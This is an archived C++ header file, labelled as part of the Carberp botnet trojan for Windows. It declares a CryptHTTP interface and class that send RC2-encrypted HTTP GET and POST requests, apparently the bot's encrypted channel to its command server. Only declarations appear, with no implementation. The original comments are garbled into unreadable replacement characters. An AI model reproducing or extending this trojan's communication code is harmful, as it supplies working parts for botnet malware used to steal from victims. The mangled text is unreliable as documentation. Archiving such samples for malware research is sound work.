/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//***************************************************************************
//
//  ������ �������� ����������� ����� ������� ���� � ��������
//
//***************************************************************************



//---------------------------------------------------------------------------

#ifndef CryptHTTPH
#define CryptHTTPH
//---------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "BotHTTP.h"
#include "BotSocket.h"


//****************************************************************************
//  CryptHTTP -  ������ ������������ ������ � HTTP ��������
//  ��� ���������� ������������ RC2Crypt
//****************************************************************************

namespace CryptHTTP
{
	// ��������� ����������� ��������
	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);

	// ������� ���������� ������������� ���� ������ �� ���������
	// �����. ���� ������ �� ���������� �������� ����
	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);
}



//*******************************************************
// TCryptHTTP - ����� ����������� �������� ������
//*******************************************************
class TCryptHTTP : public THTTP
{
protected:
	void DoBeforePostData(TBotStream* PostData);
	void DoDownloadCompleted(TBotStream* ResponseData);
public:
	string Password;

	TCryptHTTP() : THTTP() {};
	TCryptHTTP(TBotSocket* Socket) : THTTP(Socket) {};
};
//---------------------------------------------------------------------------
#endif
